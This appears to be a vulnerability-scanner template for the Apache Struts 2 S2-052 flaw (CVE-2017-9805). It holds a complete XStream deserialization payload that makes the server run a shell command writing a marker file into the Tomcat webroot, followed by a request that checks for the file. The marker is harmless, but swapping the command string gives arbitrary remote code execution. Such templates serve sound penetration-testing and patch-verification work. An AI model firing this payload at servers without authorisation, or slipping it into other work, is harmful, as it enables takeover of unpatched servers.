id: local-struts2-s2-052-rce

info:
  name: Struts2 S2-052 XStream Deserialization RCE (CVE-2017-9805)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-052 (CVE-2017-9805) RCE via XStream deserialization in REST plugin.
    Sends malicious XML to trigger ProcessBuilder execution, writes a marker file, then verifies.
  reference:
    - https://struts.apache.org/docs/s2-052.html
    - https://nvd.nist.gov/vuln/detail/CVE-2017-9805
  tags: safe-poc,exploit,struts2,s2-052,cve,cve2017,rce,deserialization

http:
  - raw:
      - |
        POST /orders/3/edit HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <flags>0</flags>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                      <cipher class="javax.crypto.NullCipher">
                        <initialized>false</initialized>
                        <opmode>0</opmode>
                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                          <iter class="javax.imageio.spi.FilterIterator">
                            <iter class="java.util.Collections$EmptyIterator"/>
                            <next class="java.lang.ProcessBuilder">
                              <command>
                                <string>sh</string>
                                <string>-c</string>
                                <string>echo pentest-platform-s2052-rce > /usr/local/tomcat/webapps/ROOT/s2052rce.txt</string>
                              </command>
                              <redirectErrorStream>false</redirectErrorStream>
                            </next>
                          </iter>
                          <filter class="javax.imageio.ImageIO$ContainsFilter">
                            <method>
                              <class>java.lang.ProcessBuilder</class>
                              <name>start</name>
                              <parameter-types/>
                            </method>
                            <name>foo</name>
                          </filter>
                          <next class="string">foo</next>
                        </serviceIterator>
                        <lock/>
                      </cipher>
                      <input class="java.lang.ProcessBuilder$NullInputStream"/>
                      <ibuffer></ibuffer>
                      <done>false</done>
                      <ostart>0</ostart>
                      <ofinish>0</ofinish>
                      <closed>false</closed>
                    </is>
                    <consumed>false</consumed>
                  </dataSource>
                  <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
            <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
          </entry>
          <entry>
            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
          </entry>
        </map>

      - |
        GET /s2052rce.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "pentest-platform-s2052-rce"
      - type: status
        status:
          - 200
